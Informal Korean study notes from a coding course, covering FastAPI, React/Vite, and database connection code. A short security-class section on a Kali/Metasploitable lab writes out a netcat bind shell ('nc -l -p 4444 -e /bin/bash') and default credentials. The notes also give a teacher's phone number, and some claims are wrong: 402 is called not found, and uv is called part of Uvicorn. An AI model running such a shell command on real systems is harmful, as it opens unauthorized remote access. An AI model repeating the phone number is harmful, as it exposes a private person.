Vercel 사용 서버 구현 - 집에서, 시간 되면 여기서
vs
FastAPI -> Backend
Vercel -> Frontend

구조
_fastapi_ app
 ㄴ main.py  --> import , get-post방식 통신(flask 와 비슷)
 ㄴ requirements.txt --> fastapi , uvicorn 버전 체크?



1. main.py 
from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI()

class Item(BaseModel):
    name: str

# GET 요청 테스트
@app.get("/hello")
def hello():
    return {"message": "Hello from FastAPI!"}

# POST 요청 테스트
@app.post("/echo")
def echo(item: Item):
    return {"you_sent": item.dict()}


2. requirements.txt 
fastapi==0.111.1
uvicorn==0.24.0


3. venv, FastAPI 설치하기 
# 가상환경 생성
python -m venv venv
venv\Scripts\activate

# FastAPI 설치
pip install -r requirements.txt


4. 테스트 (bash)
uvicorn main:app --reload
{message" : "HI}     // def hello() return {"message"} 키가 message 


curl -X POST http://127.0.0.1:8000/echo -H "Content-Type: application/json" -d "{\"name\":\"kim\"}"
(json)
{"you_sent":{"name":"kim"}}


! 백엔드 서버 完 ! 



!  REACT 서버 및 파일구조 ! 
react 대충 설치 후

git bash 열어서 react 파일 만들기 ㅇㅇ\\
npm create vite@latest your_file_name -- --template react-ts

$ code .  
: 
code → VS Code 실행 명령어
. → 현재 디렉토리 경로를 VS Code에서 열라는 의미
즉, 터미널에서 $ code .를 입력하면 현재 폴더를 VS Code에서 바로 열 수 있음
조건
터미널에서 사용하려면 VS Code가 설치되어 있어야 하고,
code 명령어가 PATH 환경 변수에 등록되어 있어야 함
VS Code에서는 Command Palette → Shell Command: Install 'code' command in PATH 선택하면 등록 가능
vsCode 열림 ㅇㅇ

https://github.com/reactjs/ko.react.dev
react 한국어


tsconfg.node , tsconfig.json -> ts 환경설정, ts 양식 설정 가능 
    "noUnusedLocals": false,
    "noUnusedParameters": false,
-> 코딩 시 자유도 올라감 
의존성 주입한 내역도 확인가능  

- 기본 사용 시 전체 파일구조 
my-app/
 ├─ index.html			v
 ├─ package.json
 ├─ vite.config.js
 └─ src/
     ├─ main.jsx			v  -  JS  - ReactDOM ReactDOM으로 렌더링:
     ├─ App.jsx ~=~ tsx?		v  -  JS  App.jsx에서 RanLunchMenu를 불러와서 사용
     └─ RanLunchMenu.jsx		v
~ > JAVA 와 흡사하다.

-Router 사용 시 React의 파일 구조 : java MVC 파일구조와 비교
src/
 ├─ components/     → 재사용 가능한 UI 컴포넌트 (Button, Navbar 등)
 ├─ pages/          → Router에서 연결되는 페이지 단위 컴포넌트
 ├─ layouts/        → 공통 레이아웃 (Header/Footer 포함 구조)
 ├─ hooks/          → 커스텀 훅 (비즈니스 로직/상태 관리)
 ├─ services/       → API 호출 (Spring의 service + repository 역할 흡사)
 ├─ context/        → 전역 상태 관리 (Redux, Context API)
 ├─ assets/         → 정적 파일 (이미지, css, 폰트)
 ├─ App.js          → Router 정의 (Spring의 DispatcherServlet 느낌)
 └─ index.js        → 진입점 (Spring Boot의 Application.java 느낌)

-> tsx 에서 바로 CSS 를 손보는 것도 가능하다. 
import { CSSProperties } from "react";

const inputStyle: CSSProperties = {
  backgroundColor: "#f0f0f0",
  border: "1px solid #ccc",
  padding: "0.5rem 1rem",
  borderRadius: "5px"
};

<input value={inputVal} onChange={...} style={inputStyle} />;


### letMake Server for python ### 
## uvicorn 설치 ~=~ apache tomcat (java)

pip install uv  -> 파이썬 버전이 달라져도 사용할 수 있게 하는(?).. uv가 뭐지 그래서  
https://devocean.sk.com/blog/techBoardDetail.do?ID=165922&boardType=techBlog 참고
uv => Uvicorn 의 uv FastAPI 같은 ASGI 기반 앱에서 사용.. 
java의 아파치-톰캣 와 비슷한 ㅇㅇ 
結 uv == WAS 
1. 설치 방법
py -3.10 -m pip install uv

py -3.10 -m uv venv venv

.\venv\Scripts\Activate.ps1
py -pythonversion -m ~~ 
\ => 역슬래시로 

2. requirements.txt 도구 설치
requirements.txt 파일 만든 후 
"
fastapi
uvicorn[standard]
sqlalchemy
asyncpg         # 비동기 PostgreSQL 드라이버 (psycopg2-binary 대신 사용)
pydantic-settings # 환경 변수 관리를 위한 Pydantic 라이브러리
python-dotenv # 로컬 개발 환경에서 .env 파일 로드를 위해 필요 (선택 사항)
pydantic # fastapi req 유효성 검사
scikit-learn
"
를 추가한 후 , 이 안에 기타 필요한 툴 설치
uv pip install -r requirements.txt
를 통해 설치 

##! if error !## 
만약 requirements 안깔린다면
.\venv\Scripts\Activate.ps1 이게 활성화 된 상태에서
pip install uv 이후 uv pip install -r requirements.txt 진행 

java도 심심하면 폼등  온갖 xml 파일에서 지랄나잖아 ㅇㅇ

# uvicorn DB와 연동하는 방법 # 
Q. 기존에 내가 했던 웹페이지에서 uvicorn 설치하고 임포트 해주면 되나?
Ans. ㅇㅇ, 대신 
uv pip install mysql-connector-python

## database_conn.py 등의 별도의 파일을 통해 단순히 DB를 호출하고 종료하는 파일을 만들기 ##
conn = mysql.connector.connect(
    host="localhost",
    user="root",
    password="비밀번호",
    database="데이터베이스명"
)

cursor = conn.cursor()
cursor.execute("SELECT * FROM CHATTING")
rows = cursor.fetchall()
print(rows)

conn.close()
이런 식으로 자바 DTO,DAO 에서 했었던 것처럼 형식에 맞추어 넣어주기만 하면 되는듯
+a 알람
# 글로벌 DB 연결 풀 변수
pool: asyncpg.Pool = None

# 서버 시작 시 호출 (FastAPI @app.on_event("startup")에서 사용)
async def connect_to_db():
    global pool
    print("DB 연결 풀 초기화 중...")
    try:
        pool = await asyncpg.create_pool(
            user=DB_USER,
            password=DB_PASSWORD,
            host=DB_HOST,
            database=DB_NAME,
            port=DB_PORT,
            ssl=DB_SSL 
        )
        print("DB 연결 성공.")
    except Exception as e:
        print(f"DB 연결 실패: {e}")
        raise e

# 서버 종료 시 호출 (FastAPI @app.on_event("shutdown")에서 사용)
async def close_db_connection():
    global pool
    if pool:
        print("DB 연결 풀 종료 중...")
        await pool.close()
        print("DB 연결 풀 종료 완료.")

# API 엔드포인트에 DB 연결 객체를 주입하는 함수 (FastAPI Depends에서 사용)
async def get_db_connection() -> AsyncGenerator[asyncpg.Connection, None]:
    """DB 연결 풀에서 커넥션을 가져와 엔드포인트에 제공합니다."""
    global pool
    if not pool:
        raise ConnectionError("DB 연결 풀이 초기화되지 않았습니다.")

    # async with 구문으로 연결을 가져와 yield 후, 자동으로 풀에 반환합니다.
    async with pool.acquire() as connection:
        yield connection



## 심화 - POST 방식으로 DB-서버 연동하기 ## 
 ✅ DB 설정 (SQLite 예시)
DATABASE_URL = "sqlite:///./test.db"
engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(bind=engine, autoflush=False, autocommit=False)
Base = declarative_base()

# ✅ DB 모델 정의
class ItemDB(Base):
    __tablename__ = "items"
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String, nullable=False)
    price = Column(Float, nullable=False)
    description = Column(String)

# ✅ DB 테이블 생성
Base.metadata.create_all(bind=engine)

# ✅ 요청 모델 정의
class Item(BaseModel):
    name: str
    price: float
    description: str | None = None

# ✅ POST 엔드포인트
@app.post("/items")
async def create_item(item: Item):
    db = SessionLocal()
    try:
        # (1) DB 모델 객체로 변환
        db_item = ItemDB(
            name=item.name,
            price=item.price,
            description=item.description
        )
        # (2) DB에 추가
        db.add(db_item)
        db.commit()
        db.refresh(db_item)  # 저장된 객체 갱신 (id 등 포함)
        return {"message": "데이터 저장 완료", "item": item}
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        db.close()








400(auth)
402(not found error)
500(internal server error)

문법 - 빨간줄 뜨니까 ㅇㅇ
컴파일 - 파이썬 저장할 때 이거 ㅅㅂ xml지랄나고 이런거 아니냐? 
런타임 - 실행해야 알 수 있는 에러

### 보안 과목 ###
## - 가상 PC+인터넷 환경 구축 -## 
Virtual Machine Linux 인터넷 연결

-> 파일 -> 환경설정 -> 네트워크 -> 네트워크 CIDR 설정 & 포트포워딩(SSH) 진행


-> kali 설정 -> 네트워크 -> NAT 네트워크 설정


-> linux 안에서 -> 네트워크-> Wired Connection IPv4 Settings -> IP주소 맞춰주기
~ 어디에 사용할지는 모르겠다... 나중에 가상환경이랑 통신하려나..??

ufw -> 방화벽 설정 ~ 미친 포트뚫기

ssh 
sudo systemctl (re)start ssh

ps -ef | grep ssh 

vstp -> 파일을 주고받을 수 있다...,?


<MeomoList 참고하여 Ranlunch 에 DB 삽입해보자>
interface Memotype {
  content: string;
  createdDt: string;
  updatedDt: string;
  id: number;
  title: string;
}
export default function MemoList() {
  const API_BASE_URL = import.meta.env.VITE_API_BASE_URL;
  const [memo, setMemo] = useState<Memotype[]>([]);

  useEffect(() => {
    getMemoList();
    //
  }, []);
  async function getMemoList() {
    const fetchOption = {
      method: "GET",
      headers: {
        Authorization: "",
      },
    };
    let res: any = await fetch(
      `${API_BASE_URL}/api/board/get_memolist`,
      fetchOption
    );
    res = await res.json();
    setMemo(res?.data ?? []);
    console.log(`## res :`, res);
  }

->  좋아 l_menu 라는 DB를 업로드를 해보자 
# 0. HONO 서버에 넣어야하겠구나.
MAIN -> index.ts  app.route("/api/menu", menu_router);

1. interface 설정
interface lunchMenutype {
name : string; 
price : number
}

2. API 함수 설정하기
export default function MenuList() {
  const API_BASE_URL = import.meta.env.VITE_API_BASE_URL;
 ## 바인딩 변수 설정 나중에 ~~~  CAUTION! useState<interface's name []>([]);

3. 불러오기 -> useEffect() 사용하여 getMenulist();

4. getMenulist() 함수 제작 ~ 비동기 방식으로 받을 것. fetch 사용할 것 위에 것 그대로 쓰면 되겠는데

5. 서버를 두개 열면.... 어떤 코드로 연동되는거냐 ? api_base_url?  
let res: any = await fetch(
      `${API_BASE_URL}/api/board/get_memolist`,
      fetchOption
    );
    res = await res.json();
    setMemo(res?.data ?? []);
    console.log(`## res :`, res);



전반적인 구조가 -> 
  HONO -> react.js -> (tsx)

----------------------------------2교시 보안 ---------------------------------
admin
password

mataploitable
sudo nc -l -p 4444 -e /bin/bash &
jobs


~~~~~


어디서 html 가져온거샅은데 

vim index.html




하나씩 하나씩 











010 4595 6530 - 오후 담임선생님 전화번호

이번 주 서버하나 파서 git에 올리기...






shorturl.at/1GzaD
shorturl.at/96aYt
